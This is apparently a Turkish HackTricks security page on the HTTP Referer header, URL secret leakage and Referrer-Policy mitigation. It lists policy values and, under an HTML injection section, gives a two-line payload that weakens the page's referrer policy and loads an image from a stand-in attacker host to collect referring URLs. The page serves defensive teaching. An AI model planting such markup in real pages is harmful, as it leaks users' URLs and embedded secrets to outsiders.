# İlginç HTTP Davranışı

{{#include ../banners/hacktricks-training.md}}

## `Referer` Header ve Referrer Policy

HTTP `Referer` request header, bir resource'un istendiği absolute veya partial URL'yi tanımlar. Aktif referrer policy'ye bağlı olarak referring origin, path ve query string'i içerebilir, ancak URL fragment'ini içermez.<sup>[[1]](#references)</sup>

### Hassas Bilgi Leak'i

URL path'lerinde veya query parameter'larında bulunan secret'lar browser history, log'lar, analytics, kopyalanan link'ler ve `Referer` header üzerinden leak olabilir. Bu nedenle cross-origin bir link veya subresource request, referring URL'yi harici bir server'a ifşa edebilir.<sup>[[2]](#references)</sup>

### Mitigation

Browser'ın ne kadar referrer bilgisi göndereceğini kontrol etmek için `Referrer-Policy` response header'ını kullanın. `strict-origin-when-cross-origin`, browser'larda modern default policy'dir; `no-referrer` ise header'ı tamamen engeller. Uygulamanın gereksinimlerine uygun policy'yi seçin.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Parolaları, oturum tanımlayıcılarını, API anahtarlarını veya diğer hassas değerleri URL'lere yerleştirmeyin. Bunları bunun yerine TLS üzerinden uygun request header'larında veya gövdelerinde gönderin.<sup>[[2]](#references)</sup>

### HTML Injection Consideration

Bir document ayrıca `<meta name="referrer">` ile sayfa genelinde geçerli bir policy ayarlayabilir. Bir HTML injection açığı, bir saldırganın geçerli bir meta element eklemesine olanak tanıyorsa saldırgan, sonraki request'ler için document policy'sini zayıflatmayı deneyebilir. Dinamik olarak eklenen veya birbiriyle çakışan meta policy'leri öngörülemez şekilde davranabilir; bu nedenle response header'ın her zaman override edildiğini varsaymak yerine davranışı hedef browser'da doğrulayın.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Temel HTML injection sorununu düzeltin ve hassas verileri URL'den uzak tutun; bir referrer policy defense in depth sağlar, ancak bu kontrollerin hiçbirinin yerini tutmaz.

## References

- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Hassas Query String'lerle GET Request Method Kullanımı](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
